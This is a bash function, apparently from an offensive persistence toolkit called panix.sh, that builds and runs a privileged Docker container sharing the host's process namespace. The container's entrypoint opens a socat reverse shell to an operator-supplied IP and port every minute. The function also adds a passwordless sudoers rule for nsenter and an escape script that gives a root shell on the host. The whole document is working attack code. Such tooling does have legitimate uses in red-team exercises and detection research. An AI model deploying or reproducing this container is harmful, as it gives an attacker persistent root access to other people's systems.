setup_malicious_docker_container() {
	local ip=""
	local port=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_malicious_docker_container() {
		echo "Usage: ./panix.sh --malicious-container [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--ip <ip>                    Specify IP address"
		echo "--port <port>                Specify port number"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--help|-h)
				usage_malicious_docker_container
				exit 0
				;;
			--examples )
				echo "Examples:"
				echo "./panix.sh --malicious-container --default --ip 10.10.10.10 --port 1337"
				exit 0
				;;
			* )
				echo "Invalid option for --malicious-container: $1"
				echo "Try './panix.sh --malicious-container --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $ip || -z $port ]]; then
		echo "Error: --ip and --port must be specified."
		echo "Try './panix.sh --malicious-container --help' for more information."
		exit 1
	fi

	if ! docker ps &> /dev/null; then
		echo "Error: Docker daemon is not running or permission denied."
		exit 1
	fi

	# Dockerfile setup and Docker image creation
	DOCKERFILE="/tmp/Dockerfile"
	cat <<-EOF > $DOCKERFILE
	FROM alpine:latest

	RUN apk add --no-cache bash socat sudo util-linux procps

	RUN adduser -D lowprivuser

	RUN echo '#!/bin/bash' > /usr/local/bin/entrypoint.sh \\
		&& echo 'while true; do /bin/bash -c "socat exec:\"/bin/bash\",pty,stderr,setsid,sigint,sane tcp:$ip:$port"; sleep 60; done' >> /usr/local/bin/entrypoint.sh \\
		&& chmod +x /usr/local/bin/entrypoint.sh

	RUN echo '#!/bin/bash' > /usr/local/bin/escape.sh \\
		&& echo 'sudo nsenter -t 1 -m -u -i -n -p -- su -' >> /usr/local/bin/escape.sh \\
		&& chmod +x /usr/local/bin/escape.sh \\
		&& echo 'lowprivuser ALL=(ALL) NOPASSWD: /usr/bin/nsenter' >> /etc/sudoers

	USER lowprivuser

	ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
	EOF

	# Building and running the Docker container
	docker build -t malicious-container -f $DOCKERFILE . && \
	docker run -d --name malicious-container --privileged --pid=host malicious-container

	echo "[+] Malicious Docker container created and running."
	echo "[+] Reverse shell is executed every minute."
	echo "[+] To escape the container with root privileges, run '/usr/local/bin/escape.sh'."
	echo "[+] Docker container persistence established!" 
}
